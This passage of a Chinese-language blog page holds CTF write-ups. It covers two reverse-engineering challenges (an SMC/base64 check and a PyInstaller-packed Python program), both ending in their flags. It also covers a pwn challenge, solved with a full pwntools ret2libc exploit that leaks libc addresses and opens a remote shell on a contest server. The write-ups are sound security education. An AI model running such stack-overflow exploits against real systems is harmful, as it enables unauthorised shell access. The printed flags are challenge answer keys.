v12; // esi</span><br><span class="line">  char *v13; // ebx</span><br><span class="line">  int v14; // edi</span><br><span class="line">  unsigned int v15; // eax</span><br><span class="line">  char *v16; // ecx</span><br><span class="line">  unsigned int v17; // edx</span><br><span class="line">  signed int v18; // ecx</span><br><span class="line">  int v19; // esi</span><br><span class="line">  unsigned int v20; // eax</span><br><span class="line">  signed int v21; // ecx</span><br><span class="line">  signed int v22; // eax</span><br><span class="line">  int v24; // [esp+8h] [ebp-2Ch]</span><br><span class="line">  char *v25; // [esp+Ch] [ebp-28h]</span><br><span class="line">  unsigned int v26; // [esp+10h] [ebp-24h]</span><br><span class="line">  char Dest[4]; // [esp+14h] [ebp-20h]</span><br><span class="line">  char *Source; // [esp+18h] [ebp-1Ch]</span><br><span class="line">  int v29; // [esp+1Ch] [ebp-18h]</span><br><span class="line">  int v30; // [esp+20h] [ebp-14h]</span><br><span class="line">  char v31; // [esp+24h] [ebp-10h]</span><br><span class="line">  char v32; // [esp+28h] [ebp-Ch]</span><br><span class="line">  char v33; // [esp+29h] [ebp-Bh]</span><br><span class="line">  char v34; // [esp+2Ah] [ebp-Ah]</span><br><span class="line">  char v35; // [esp+2Bh] [ebp-9h]</span><br><span class="line">  char v36; // [esp+2Ch] [ebp-8h]</span><br><span class="line">  char v37; // [esp+2Dh] [ebp-7h]</span><br><span class="line"></span><br><span class="line">  v24 = (int)a2;</span><br><span class="line">  v2 = 5;</span><br><span class="line">  v3 = &quot;蝾秕亠&quot;;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(unsigned __int8 *)v3++;</span><br><span class="line">    if ( ((char)a2[v2] ^ 0x86) != v4 )</span><br><span class="line">LABEL_12:</span><br><span class="line">      exit(0);</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v2 &lt; 11 );</span><br><span class="line">  v30 = &apos;fNWb&apos;;</span><br><span class="line">  v5 = a2[11];</span><br><span class="line">  v29 = &apos;z91c&apos;;</span><br><span class="line">  v32 = v5;</span><br><span class="line">  v6 = a2[13];</span><br><span class="line">  v31 = 0;</span><br><span class="line">  v7 = a2[12];</span><br><span class="line">  v34 = v6;</span><br><span class="line">  v8 = a2[15];</span><br><span class="line">  v33 = v7;</span><br><span class="line">  v9 = a2[14];</span><br><span class="line">  v10 = a2[16];</span><br><span class="line">  v36 = v8;</span><br><span class="line">  v37 = v10;</span><br><span class="line">  v35 = v9;</span><br><span class="line">  v11 = strlen(&amp;v32);</span><br><span class="line">  v12 = v11 / 3 + (v11 % 3 != 0);</span><br><span class="line">  v13 = (char *)malloc(4 * v12 + 1);</span><br><span class="line">  v25 = v13;</span><br><span class="line">  memset(v13, 0, 4 * v12 + 1);</span><br><span class="line">  if ( v12 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    Source = &amp;v32;</span><br><span class="line">    v26 = v11 / 3 + (v11 % 3 != 0);</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = 0;</span><br><span class="line">      *(_DWORD *)Dest = 0;</span><br><span class="line">      strncpy(Dest, Source, 3u);</span><br><span class="line">      v15 = 0;</span><br><span class="line">      v16 = &amp;Dest[strlen(Dest) + 1];</span><br><span class="line">      v17 = v16 - &amp;Dest[1];</span><br><span class="line">      if ( v16 != &amp;Dest[1] )</span><br><span class="line">      &#123;</span><br><span class="line">        v18 = 16;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          v19 = Dest[v15++] &lt;&lt; v18;</span><br><span class="line">          v18 -= 8;</span><br><span class="line">          v14 |= v19;</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v15 &lt; v17 );</span><br><span class="line">      &#125;</span><br><span class="line">      v20 = 0;</span><br><span class="line">      v21 = 18;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v17 + 1 &lt;= v20 )</span><br><span class="line">          v13[v20] = 61;</span><br><span class="line">        else</span><br><span class="line">          v13[v20] = byte_402108[(v14 &gt;&gt; v21) &amp; 0x3F];</span><br><span class="line">        v21 -= 6;</span><br><span class="line">        ++v20;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v21 &gt; -6 );</span><br><span class="line">      Source += 3;</span><br><span class="line">      v13 += 4;</span><br><span class="line">      --v26;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v26 );</span><br><span class="line">    v13 = v25;</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *((_BYTE *)&amp;v29 + v22) != *((_BYTE *)&amp;v29 + v22 + v13 - (char *)&amp;v29) )</span><br><span class="line">      goto LABEL_12;</span><br><span class="line">    ++v22;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v22 &lt; 8 );</span><br><span class="line">  return sub_401000(v24);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>首先我在IDA中通过查找所有字符串发现存在有：“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/<br>”，那么就可以断言该程序中涉及到base64解密或者是base64加密，在该函数的中一个像base加密后的字符串，所以我们就先解密一下（注意这里大小端、字符串顺序问题）：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">print base64.b64decode(&quot;c19zbWNf&quot;)</span><br><span class="line"></span><br><span class="line">out：s_smc_</span><br></pre></td></tr></table></figure>
<ul>
<li>然后下面的可能是改程序对这个字符串进行base解密操作，再次之前，程序对前11位进行了检查，前五位必须是“flag”，而后五位与0x86异或得出来的必须是程序中给出来的一串数据，那么可以反前出来前11位：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print chr(0xf2^0x86),</span><br><span class="line">print chr(0xee^0x86),</span><br><span class="line">print chr(0xef^0x86),</span><br><span class="line">print chr(0xf5^0x86),</span><br><span class="line">print chr(0xd9^0x86),</span><br><span class="line">print chr(0xef^0x86),</span><br><span class="line"></span><br><span class="line">out：this_i</span><br></pre></td></tr></table></figure>
<ul>
<li>然后最后return的时候，发现该函数引用了sub_401000函数，flag括号中的长度限制为34个，而我们现在已知的已经是12，剩下22位，然后回头看一下迷宫的出来的路径的长度，正好是22个，所以最后将的出来的字符串进行拼接就是flag。<blockquote>
<p>flag：flag{this_is_smc_waaaaawwwww22222qqqaaw}</p>
</blockquote>
</li>
</ul>
<h3 id="SHE"><a href="#SHE" class="headerlink" title="SHE"></a>SHE</h3><p>题目给了一个pyc文件和一个exe文件，通过查阅资料发现这个EXE文件是PyInstaller用pyc文件生成的windows可执行文件。那么相对应的有一个脚本“pyinstxtractor.py”，用于提取PyInstaller生成的windows可执行文件的内容，<a href="https://sourceforge.net/projects/pyinstallerextractor/" target="_blank" rel="noopener">下载地址</a> 。</p>
<h4 id="提取题目提供的EXE文件"><a href="#提取题目提供的EXE文件" class="headerlink" title="提取题目提供的EXE文件"></a>提取题目提供的EXE文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">➜  she python pyinstxtractor.py AnhengRe.exe </span><br><span class="line">[*] Processing AnhengRe.exe</span><br><span class="line">[*] Pyinstaller version: 2.1+</span><br><span class="line">[*] Python version: 36</span><br><span class="line">[*] Length of package: 6075342 bytes</span><br><span class="line">[*] Found 59 files in CArchive</span><br><span class="line">[*] Beginning extraction...please standby</span><br><span class="line">[+] Possible entry point: pyiboot01_bootstrap</span><br><span class="line">[+] Possible entry point: AnhengRe</span><br><span class="line">[!] Warning: The script is running in a different python version than the one used to build the executable</span><br><span class="line">    Run this script in Python36 to prevent extraction errors(if any) during unmarshalling</span><br><span class="line">[!] Unmarshalling FAILED. Cannot extract out00-PYZ.pyz. Extracting remaining files.</span><br><span class="line">[*] Successfully extracted pyinstaller archive: AnhengRe.exe</span><br><span class="line"></span><br><span class="line">You can now use a python decompiler on the pyc files within the extracted directory</span><br><span class="line"></span><br><span class="line">➜  she cd AnhengRe.exe_extracted </span><br><span class="line"></span><br><span class="line">➜  AnhengRe.exe_extracted ls</span><br><span class="line"></span><br><span class="line"> AnhengRe                                        api-ms-win-crt-filesystem-l1-1-0.dll</span><br><span class="line"> AnhengRe.exe.manifest                           api-ms-win-crt-heap-l1-1-0.dll</span><br><span class="line"> api-ms-win-core-console-l1-1-0.dll              api-ms-win-crt-locale-l1-1-0.dll</span><br><span class="line"> api-ms-win-core-datetime-l1-1-0.dll             api-ms-win-crt-math-l1-1-0.dll</span><br><span class="line"> api-ms-win-core-debug-l1-1-0.dll                api-ms-win-crt-process-l1-1-0.dll</span><br><span class="line"> api-ms-win-core-errorhandling-l1-1-0.dll        api-ms-win-crt-runtime-l1-1-0.dll</span><br><span class="line"> api-ms-win-core-file-l1-1-0.dll                 api-ms-win-crt-stdio-l1-1-0.dll</span><br><span class="line"> api-ms-win-core-file-l1-2-0.dll                 api-ms-win-crt-string-l1-1-0.dll</span><br><span class="line"> api-ms-win-core-file-l2-1-0.dll                 api-ms-win-crt-time-l1-1-0.dll</span><br><span class="line"> api-ms-win-core-handle-l1-1-0.dll               api-ms-win-crt-utility-l1-1-0.dll</span><br><span class="line"> api-ms-win-core-heap-l1-1-0.dll                 base_library.zip</span><br><span class="line"> api-ms-win-core-interlocked-l1-1-0.dll          _bz2.pyd</span><br><span class="line"> api-ms-win-core-libraryloader-l1-1-0.dll        _hashlib.pyd</span><br><span class="line"> api-ms-win-core-localization-l1-2-0.dll         _lzma.pyd</span><br><span class="line"> api-ms-win-core-memory-l1-1-0.dll               out00-PYZ.pyz</span><br><span class="line"> api-ms-win-core-namedpipe-l1-1-0.dll            out00-PYZ.pyz_extracted</span><br><span class="line"> api-ms-win-core-processenvironment-l1-1-0.dll   pyexpat.pyd</span><br><span class="line"> api-ms-win-core-processthreads-l1-1-0.dll       pyiboot01_bootstrap</span><br><span class="line"> api-ms-win-core-processthreads-l1-1-1.dll       pyimod01_os_path</span><br><span class="line"> api-ms-win-core-profile-l1-1-0.dll              pyimod02_archive</span><br><span class="line"> api-ms-win-core-rtlsupport-l1-1-0.dll           pyimod03_importers</span><br><span class="line"> api-ms-win-core-string-l1-1-0.dll              &apos;pyi-windows-manifest-filename AnhengRe.exe.manifest&apos;</span><br><span class="line"> api-ms-win-core-synch-l1-1-0.dll                python36.dll</span><br><span class="line"> api-ms-win-core-synch-l1-2-0.dll                select.pyd</span><br><span class="line"> api-ms-win-core-sysinfo-l1-1-0.dll              _socket.pyd</span><br><span class="line"> api-ms-win-core-timezone-l1-1-0.dll             _ssl.pyd</span><br><span class="line"> api-ms-win-core-util-l1-1-0.dll                 struct</span><br><span class="line"> api-ms-win-crt-conio-l1-1-0.dll                 ucrtbase.dll</span><br><span class="line"> api-ms-win-crt-convert-l1-1-0.dll               unicodedata.pyd</span><br><span class="line"> api-ms-win-crt-environment-l1-1-0.dll           VCRUNTIME140.dll</span><br><span class="line">➜  AnhengRe.exe_extracted</span><br></pre></td></tr></table></figure>
<p>通过查看提取出来的文件，dll文件是windows上可执行程序的动态链接库，pyd文件是python动态模块，实质上还是dll文件，只是改了后缀名字。再仔细看，不难发现有一个可疑的文件叫“AnhengRe”，strings一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  AnhengRe.exe_extracted strings AnhengRe</span><br><span class="line">Tell me your name?z</span><br><span class="line">Tell me your pasw</span><br><span class="line">9f1ff1e8b5b91110</span><br><span class="line">c4e21c11a2412</span><br><span class="line">wrong</span><br><span class="line">AnHeng</span><br><span class="line">Congratulations</span><br><span class="line">flag</span><br><span class="line">pause</span><br><span class="line">flag&#123;</span><br><span class="line">no,)</span><br><span class="line">input</span><br><span class="line">range</span><br><span class="line">print</span><br><span class="line">system</span><br><span class="line">AnhengRe.py</span><br><span class="line">&lt;module&gt;</span><br><span class="line">➜  AnhengRe.exe_extracted</span><br></pre></td></tr></table></figure>
<p>观察结果，我们可以通过”&lt;module>“来判断这是一个pyc文件，<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">pyc文件在线还原</a>，发现还原不了，文件错误，后来才发现需要修复文件头，这个pyc文件是3.6的，所以找一个python3.6的pyc文件，将文件头复制一份就可以。还原成py文件的源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">n1 = input(&apos;Tell me your name?&apos;)</span><br><span class="line">n2 = input(&apos;Tell me your pasw&apos;)</span><br><span class="line">n11 = chr(ord(n1[0]) + 12)</span><br><span class="line">s = &apos;&apos;</span><br><span class="line">st3 = &apos;51e&apos;</span><br><span class="line">st2 = &apos;9f1ff1e8b5b91110&apos;</span><br><span class="line">st1 = &apos;c4e21c11a2412&apos;</span><br><span class="line">st0 = &apos;wrong&apos;</span><br><span class="line">if n11 + &apos;AnHeng&apos; == n2:</span><br><span class="line">    for i in range(0, 4):</span><br><span class="line">        s += st1[3 - i]</span><br><span class="line">    </span><br><span class="line">    print(&apos;Congratulations&apos;)</span><br><span class="line">    ts = st2[0] + st3 + st2[1] + s</span><br><span class="line">    print(&apos;flag&#123;&apos; + st3[:1] + st1 + st2 + st3[-2:] + &apos;&#125;&apos;)</span><br><span class="line">    os.system(&apos;pause&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;no,&apos; + st0)</span><br></pre></td></tr></table></figure>
<p>我们把if去掉，执行这个py文件即可获取flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  she python getflag.py </span><br><span class="line">Congratulations</span><br><span class="line">flag&#123;5c4e21c11a24129f1ff1e8b5b911101e&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="rrr"><a href="#rrr" class="headerlink" title="rrr"></a>rrr</h2><p>checksec一下，只开启了NX（栈不可执行）保护</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  rrr checksec --file rrr </span><br><span class="line">[*] &apos;/home/wxm/Desktop/2019\xe5\xae\x89\xe6\x81\x92/pwn/rrr/rrr&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<ul>
<li>关键代码：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">int sub_80485A5()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line">  char v1; // bl</span><br><span class="line">  char v2; // al</span><br><span class="line">  size_t v3; // edx</span><br><span class="line">  int buf[8]; // [esp+8h] [ebp-30h]</span><br><span class="line">  unsigned int seed; // [esp+28h] [ebp-10h]</span><br><span class="line">  unsigned int i; // [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  seed = time(0);</span><br><span class="line">  sub_804857B();</span><br><span class="line">  puts(&quot;&gt;&quot;);</span><br><span class="line">  srand(seed);</span><br><span class="line">  v0 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    buf[v0] = 0;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v0 &lt; 8 );</span><br><span class="line">  read(0, buf, 160u);</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = strlen(buf);</span><br><span class="line">    if ( v3 &lt;= i )</span><br><span class="line">      break;</span><br><span class="line">    v1 = *(buf + i);</span><br><span class="line">    v2 = rand();</span><br><span class="line">    *(buf + i) = v2 ^ v1;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>发现read函数可以读入160个长度的字符串，存在栈溢出，但是程序对我们的字符串进行了处理，显示通过strlen()计算出长度，然后将每一位都和一个通过时间产生的随机数进行异或。strlen函数的作用机制是当遇到“\0”的时候就会截止，返回的是”\0”之前字符串的长度，那么我们就可以在我们的payload存在一个“\0”，使得我们的payload不被改变。</li>
</ul>
<ol>
<li>通过构造payload来泄露出puts的真实地址</li>
<li>通过真实地址计算出基地址</li>
<li>结合提供的libc文件计算出system、“/bin/sh”的真实地址</li>
<li>构造payload拿到shell</li>
</ol>
<blockquote>
<p>EXP:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(&quot;101.71.29.5&quot;,10013)</span><br><span class="line">e = ELF(&quot;./rrr&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">offset = 0x30+4</span><br><span class="line">start_addr = 0x8048480</span><br><span class="line"># print e.plt</span><br><span class="line"></span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">puts_plt = e.plt[&apos;puts&apos;]</span><br><span class="line">print &quot;puts_got:&quot;+hex(puts_got)</span><br><span class="line">print r.recv()</span><br><span class="line">payload = &quot;a&quot;*(offset-1)+&quot;\x00&quot;+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">str1 = r.recv()[:4].encode(&quot;hex&quot;)</span><br><span class="line">str1 = str1[6:]+str1[4:6]+str1[2:4]+str1[0:2]</span><br><span class="line">puts_addr = eval(&quot;0x&quot;+str1)</span><br><span class="line">base_libc_addr = puts_addr-libc.symbols[&apos;puts&apos;]</span><br><span class="line">print &quot;base_libc_addr:&quot;+hex(base_libc_addr)</span><br><span class="line">system_addr = base_libc_addr+libc.symbols[&apos;system&apos;]</span><br><span class="line">print &quot;system_addr:&quot;+hex(system_addr)</span><br><span class="line">binsh_libc_addr = 0x0015902b</span><br><span class="line">binsh_addr = binsh_libc_addr+base_libc_addr</span><br><span class="line">print &quot;binsh_addr:&quot;+hex(binsh_addr)</span><br><span class="line"></span><br><span class="line"># read_plt = e.plt[&apos;read&apos;]</span><br><span class="line">payload = &quot;a&quot;*(offset-1)+&quot;\x00&quot;+p32(system_addr)+p32(start_addr)+p32(binsh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.ax1x.com/2019/01/26/kuVWYn.jpg" alt> </p>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
